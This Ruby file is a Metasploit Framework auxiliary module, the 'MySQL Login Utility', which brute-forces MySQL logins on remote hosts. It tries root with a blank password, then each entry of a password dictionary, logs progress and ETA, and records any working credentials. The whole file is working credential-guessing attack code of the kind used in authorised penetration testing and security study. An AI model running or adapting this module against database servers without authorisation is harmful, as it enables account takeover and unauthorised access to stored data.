##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::MYSQL
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report


	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'MySQL Login Utility',
			'Description'	=> 'This module simply queries the MySQL instance for a specific user/pass (default is root with blank).',
			'Author'		=> [ 'Bernardo Damele A. G. <bernardo.damele [at] gmail.com>' ],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision$'
		))

		register_options(
			[
				OptString.new('MYSQL_PASS_FILE', [ false, 'A dictionary of passwords to perform a bruteforce attempt']),
				OptBool.new('VERBOSE', [ true, 'Verbose output', false])
			], self.class)
	end


	def run_host(ip)

		user = datastore['MYSQL_USER'].to_s
		user = "root" if user.empty?

		if (datastore['MYSQL_PASS_FILE'] and not datastore['MYSQL_PASS_FILE'].empty?)
			stime = Time.now.to_f
			cnt = 0

			File.open(datastore['MYSQL_PASS_FILE'], "rb") do |fd|
				lcnt = 0
				fd.each_line{lcnt += 1 }
				fd.seek(0)

				# Always try a blank password (not handled in the file parsing)
				ret = do_login(user, '', datastore['VERBOSE'])
				return if ret == :pass
				return if ret == :error

				fd.each_line do |line|
					line.strip!
					next if line =~ /^#/
					next if line.empty?

					ret = do_login(user, line.strip, datastore['VERBOSE'])
					break if ret == :pass
					break if ret == :error

					cnt += 1
					if(cnt % 1000 == 0)
						pps = (cnt / (Time.now.to_f - stime)).to_i
						pct = (cnt/lcnt.to_f * 100.0).to_i
						eta = ((lcnt - cnt) / pps / 60.0).to_i
						print_status(
							"#{rhost}:#{rport} completed #{cnt}/#{lcnt} passwords (#{pct}%) " +
							"at a rate of #{pps} per second " +
							"ETA #{eta} minutes"
						)
					end
				end
			end
		else
			do_login(user, datastore['MYSQL_PASS'], datastore['VERBOSE'])
		end
	end


	def do_login(user='root', pass='', verbose=false)

		print_status("Trying username:'#{user}' with password:'#{pass}' against #{rhost}:#{rport}") if verbose
		begin
			mysql_login(user, pass)
			print_status("#{rhost}:#{rport} successful logged in as '#{user}' with password '#{pass}'")
			report_auth_info(
				:host   => rhost,
				:proto  => 'MYSQL',
				:user   => user,
				:pass   => pass,
				:targ_host => rhost,
				:targ_port => rport
			)
			return :pass
		rescue ::RbMysql::AccessDeniedError
				print_status("#{rhost}:#{rport} failed to login as '#{user}' with password '#{pass}'") if verbose
				return :fail
		rescue ::RbMysql::Error => e
			print_error("#{rhost}:#{rport} failed to login: #{e}")
			return :error
		rescue ::Interrupt
			raise $!
		rescue ::Rex::ConnectionError
			return :error
		end
	end
end

